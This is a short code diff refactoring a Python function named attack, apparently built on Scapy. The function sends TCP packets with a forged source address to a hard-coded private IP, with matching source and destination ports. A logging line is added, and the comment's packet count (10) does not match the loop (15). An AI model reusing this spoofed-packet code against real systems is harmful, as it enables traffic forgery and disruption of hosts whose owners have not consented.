@@ -20,14 +20,13 @@ def geolocation(src_ip):
 def attack(ip_address):
     source_server = ip_address
     target_server = "172.17.144.87"
+    # Log target
+    print("Performing attack on ip: {0}".format(target_server))
 
     # Send 10 attack packets
     for x in range(0, 15):
         port = random.randint(40000, 42000)
-        layer_2 = Ether()
-        layer_3 = IP(src=source_server, dst=target_server)
-        layer_4 = TCP(sport=port,dport=port)
-        tcp_pkt = layer_2 / layer_3 / layer_4
+        tcp_pkt = Ether() / IP(src=source_server, dst=target_server) / TCP(sport=port,dport=port)
         sendp(tcp_pkt)
 
 
